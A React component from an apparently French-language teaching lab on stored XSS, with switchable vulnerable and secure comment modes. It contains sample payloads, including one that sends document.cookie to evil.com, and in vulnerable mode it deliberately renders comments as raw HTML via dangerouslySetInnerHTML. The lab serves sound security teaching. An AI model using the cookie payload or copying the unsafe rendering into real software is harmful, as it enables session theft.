import { useState, useEffect } from 'react';
import client from '../../api/client';
const PAYLOADS = [
  { label: "Script Tag",  value: "<script>alert('Stored XSS!')</script>" },
  { label: "Image Event", value: "<img src=x onerror=alert('XSS img')>" },
  { label: "Cookie",      value: "<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>" },
];
function timeAgo(d) { const s = Math.floor((Date.now()-new Date(d))/1000); if(s<60)return`${s}s`; if(s<3600)return`${Math.floor(s/60)}m`; return`${Math.floor(s/3600)}h`; }
export default function StoredXSS({ mode }) {
  const [author,setA]=useState(''); const [content,setC]=useState(''); const [comments,setComments]=useState([]);
  const [loading,setL]=useState(false); const [msg,setMsg]=useState(null);
  const v = mode === 'vulnerable';
  const fetchComments = async () => { try { const { data } = await client.get('/xss/comments'); setComments(data.comments?.filter(c => c.endpoint_type === mode) || []); } catch {} };
  useEffect(() => { fetchComments(); }, []);
  const post = async (e) => { e.preventDefault(); if (!content.trim()) return; setL(true);
    try { const { data } = await client.post(v ? '/xss/comment-vulnerable' : '/xss/comment-secure', { author: author || 'Anonymous', content }); setMsg(data); setC(''); fetchComments(); }
    catch (err) { setMsg({ error: err.response?.data?.error || 'Erreur' }); } setL(false); };
  const reset = async () => { if (!confirm('Réinitialiser ?')) return; await client.delete('/xss/comments'); fetchComments(); };
  return (
    <div className="space-y-5">
      <div className="card text-sm" style={{ border: '1px solid rgba(59,130,246,0.3)' }}>
        <div className="font-semibold mb-2" style={{ color: '#93c5fd' }}>📚 XSS Stocké (Persistant)</div>
        <p style={{ color: 'var(--text-muted)', lineHeight: '1.6' }}>{v ? 'Le payload est stocké en base de données et exécuté pour chaque visiteur.' : 'Le payload est encodé avant stockage — les balises HTML deviennent du texte.'}</p>
      </div>
      <div className="flex flex-wrap gap-2">{PAYLOADS.map(pl => <button key={pl.label} onClick={() => setC(pl.value)} className={`btn text-xs py-1 px-2 ${v ? 'btn-danger' : 'btn-ghost'}`}>{pl.label}</button>)}</div>
      <form onSubmit={post} className="space-y-3">
        <div><label className="text-xs mb-1 block" style={{ color: 'var(--text-muted)' }}>Auteur</label>
          <input value={author} onChange={e => setA(e.target.value)} className={`input-dark ${v ? 'input-vulnerable' : 'input-secure'}`} placeholder="Votre nom..." /></div>
        <div><label className="text-xs mb-1 block" style={{ color: 'var(--text-muted)' }}>Commentaire</label>
          <textarea value={content} onChange={e => setC(e.target.value)} rows={3} className={`input-dark ${v ? 'input-vulnerable' : 'input-secure'} font-mono text-xs`} placeholder={v ? "Payload XSS..." : "Sera encodé avant stockage..."} style={{ resize: 'vertical' }} /></div>
        <div className="flex gap-2">
          <button type="submit" disabled={loading} className={`btn flex-1 ${v ? 'btn-danger' : 'btn-success'}`}>{loading ? '⏳...' : v ? '⚠️ Poster (Vulnérable)' : '✅ Poster (Sécurisé)'}</button>
          <button type="button" onClick={reset} className="btn btn-ghost">🔄</button>
        </div>
      </form>
      {msg && <div className="rounded-lg p-3 text-xs animate-slide-in" style={{ background: msg.xss_detected ? 'rgba(239,68,68,0.1)' : 'rgba(0,255,136,0.06)', border: `1px solid ${msg.xss_detected ? 'rgba(239,68,68,0.4)' : 'rgba(0,255,136,0.3)'}`, color: msg.xss_detected ? '#fca5a5' : '#86efac' }}>{msg.error || msg.message}</div>}
      <div>
        <div className="text-sm font-semibold mb-3" style={{ color: 'var(--text-primary)' }}>💬 Commentaires <span className="text-xs font-normal" style={{ color: 'var(--text-muted)' }}>{v ? '⚠️ HTML brut' : '✅ Texte encodé'}</span></div>
        <div className="space-y-3">
          {comments.length === 0 ? <div className="card text-center py-6" style={{ color: 'var(--text-muted)' }}>Aucun commentaire — soyez le premier !</div>
            : comments.map(c => (
            <div key={c.id} className="card" style={{ border: `1px solid ${v ? 'rgba(239,68,68,0.2)' : 'rgba(0,255,136,0.15)'}` }}>
              <div className="flex justify-between mb-2">
                <span className="text-xs font-semibold" style={{ color: v ? '#fca5a5' : 'var(--neon-green)' }}>{c.author}</span>
                <span className="text-xs" style={{ color: 'var(--text-muted)' }}>{timeAgo(c.created_at)}</span>
              </div>
              {v ? <div dangerouslySetInnerHTML={{ __html: c.content }} className="text-sm" style={{ color: 'var(--text-primary)' }} />
                 : <div className="text-sm" style={{ color: 'var(--text-primary)' }}>{c.content}</div>}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
